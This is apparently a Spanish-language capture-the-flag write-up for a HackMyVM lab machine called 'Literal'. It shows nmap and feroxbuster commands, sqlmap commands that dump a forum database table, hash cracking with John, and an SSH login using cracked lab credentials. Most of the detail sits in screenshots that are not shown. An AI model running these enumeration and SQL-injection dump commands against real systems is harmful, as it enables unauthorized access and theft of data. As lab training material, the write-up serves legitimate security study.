# Máquina Literal
### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 10.0.2.6

![alt text](image-1.png)


### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 10.0.2.6

![alt text](image-2.png)


### Fuzzing Web

feroxbuster --url http://10.0.2.6/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

no se encontró nada

al entrar a la web:

![alt text](image-3.png)

agrego el dominio al /etc/hosts

![alt text](image-4.png)

Enumero al dominio blog.literal.hmv

feroxbuster --url http://blog.literal.hmv/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-5.png)

entré a login.php

![alt text](image-6.png)

me creé una cuenta daniel:12345678 e inicié sesión

![alt text](image-7.png)

Utilicé burpsuite para interceptar la petición y lo envié al repeater

![alt text](image-8.png)

imprimí el nombre de la base de datos

![alt text](image-9.png)

ví las tablas

![alt text](image-10.png)

vi las columnas dentro de la tablas users

![alt text](image-11.png)

vemos el primer usuario:


![alt text](image-12.png)

haciendo el mismo proceso, ví que hay 17 usuarios de los cuales hay dos que tienen un correo de un subdominio diferente:

![alt text](image-13.png)

agregué el subdominio al /etc/hosts

![alt text](image-14.png)

realicé fuzzing:

feroxbuster --url http://forumtesting.literal.hmv/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-15.png)

entrando a la web:

http://forumtesting.literal.hmv/category.php

![alt text](image-16.png)

intercepté la petición y la guardé

![alt text](image-17.png)

ejecuté sqlmap:

sqlmap -r literal --batch -dbs

![alt text](image-18.png)

ví las tablas dentro de la base de datos forumtesting

sqlmap -r literal --batch -dbs -D forumtesting --tables

![alt text](image-19.png)

ví los registros de la tabla forum_owner

sqlmap -r literal --batch -dbs -D forumtesting -T forum_owner -dump

![alt text](image-20.png)

identifiqué el tipo del hash:

![alt text](image-21.png)

hice cracking con johntheripper

![alt text](image-22.png)

### Explotación

Me conecté por ssh con las credenciales:

carlos:ssh100889

![alt text](image-23.png)

### Escalar privilegios

![alt text](image-24.png)

### user.txt

![alt text](image-25.png)

### root.txt

![alt text](image-26.png)